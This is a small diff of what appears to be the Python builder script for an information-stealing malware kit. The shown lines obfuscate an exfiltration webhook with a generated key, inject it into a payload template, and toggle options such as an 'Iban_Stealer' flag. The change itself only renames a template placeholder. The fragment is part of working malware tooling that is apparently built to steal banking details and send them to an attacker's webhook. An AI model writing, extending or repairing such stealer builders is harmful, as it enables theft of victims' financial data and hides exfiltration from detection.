@@ -203,7 +203,7 @@ while True:
     custom_key = generate_key(key_length)
 
     Webhook = obf(Webhook.encode(), custom_key)
-    new_content = content.replace("'%Webhook%'", f'{str(Webhook)}' + ',' + f'{str(custom_key)}')
+    new_content = content.replace("'%WEBHOOK%'", f'{str(Webhook)}' + ',' + f'{str(custom_key)}')
     new_content = new_content.replace("'%Debug%'", str(Debug))
     if Iban_Stealer == True:
         new_content = new_content.replace("'%IbanStealer%'", str(Iban_Stealer))
